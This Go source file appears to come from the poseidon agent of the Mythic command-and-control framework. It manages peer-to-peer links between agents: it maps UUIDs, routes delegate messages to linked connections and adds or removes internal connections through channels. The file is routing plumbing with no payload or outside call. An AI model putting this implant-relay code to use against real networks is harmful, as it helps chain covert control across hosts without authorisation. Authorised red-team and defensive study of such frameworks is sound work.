package p2p

import (
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"sync"
)

var (
	uuidMappings                    = make(map[string]string)
	uuidMappingsLock                sync.RWMutex
	availableP2P                    = make(map[string]structs.P2PProcessor)
	availableP2PLock                sync.RWMutex
	RemoveInternalConnectionChannel = make(chan structs.RemoveInternalConnectionMessage, 5)
	AddInternalConnectionChannel    = make(chan structs.AddInternalConnectionMessage, 5)
)

func registerAvailableP2P(newP2PProcessor structs.P2PProcessor) {
	availableP2PLock.Lock()
	defer availableP2PLock.Unlock()
	availableP2P[newP2PProcessor.ProfileName()] = newP2PProcessor
}

func GetInternalP2PMap() string {
	availableP2PLock.RLock()
	defer availableP2PLock.RUnlock()
	output := ""
	for p2pType, _ := range availableP2P {
		output += availableP2P[p2pType].ProfileName() + ":\n"
		output += availableP2P[p2pType].GetInternalP2PMap() + "\n"
	}
	return output
}

// getInternalConnectionUUID converts a random UUID into a proper MythicUUID for delegate messages via P2P
func getInternalConnectionUUID(oldUUID string) string {
	uuidMappingsLock.RLock()
	defer uuidMappingsLock.RUnlock()
	if newUUID, ok := uuidMappings[oldUUID]; ok {
		return newUUID
	}
	return oldUUID
}

// getInternalConnectionUUID adds a key/value pair to the internal uuidMappings
func addInternalConnectionUUID(key string, value string) {
	uuidMappingsLock.Lock()
	defer uuidMappingsLock.Unlock()
	uuidMappings[key] = value
}

// HandleDelegateMessageForInternalP2PConnections forwards delegate messages to the right TCP connections
func HandleDelegateMessageForInternalP2PConnections(delegates []structs.DelegateMessage) {
	availableP2PLock.RLock()
	defer availableP2PLock.RUnlock()
	for i := 0; i < len(delegates); i++ {
		//fmt.Printf("HTTP's HandleInternalDelegateMessages going to linked node: %v\n", delegates[i])
		// check to see if this message goes to something we know about

		if _, ok := availableP2P[delegates[i].C2ProfileName]; ok {
			// Mythic told us that our UUID is wrong and there's a different one to use
			if delegates[i].MythicUUID != "" && delegates[i].MythicUUID != delegates[i].UUID {
				addInternalConnectionUUID(delegates[i].UUID, delegates[i].MythicUUID)
			}
			availableP2P[delegates[i].C2ProfileName].ProcessIngressMessageForP2P(&delegates[i])
		}

	}
}
func listenForRemoveInternalP2PConnections() {
	for {
		select {
		case removeConnection := <-RemoveInternalConnectionChannel:
			//fmt.Printf("listenForRemoveInternalP2PConnections message from channel for %v\n", removeConnection)
			successfullyRemovedConnection := false
			removalMessage := structs.P2PConnectionMessage{
				Action:        "remove",
				C2ProfileName: removeConnection.C2ProfileName,
				Destination:   removeConnection.ConnectionUUID,
				Source:        profiles.GetMythicID(),
			}
			availableP2PLock.RLock()
			if _, ok := availableP2P[removeConnection.C2ProfileName]; ok {
				successfullyRemovedConnection = availableP2P[removeConnection.C2ProfileName].RemoveInternalConnection(removeConnection.ConnectionUUID)
			}
			availableP2PLock.RUnlock()
			//successfullyRemovedConnection = RemoveInternalTCPConnection(removeConnection)
			if successfullyRemovedConnection {
				profiles.P2PConnectionMessageChannel <- removalMessage
			}
		}
	}
}
func listenForAddInternalP2PConnections() {
	for {
		addConnection := <-AddInternalConnectionChannel
		availableP2PLock.RLock()
		if _, ok := availableP2P[addConnection.C2ProfileName]; ok {
			availableP2P[addConnection.C2ProfileName].AddInternalConnection(addConnection.Connection)
		}
		availableP2PLock.RUnlock()
	}
}
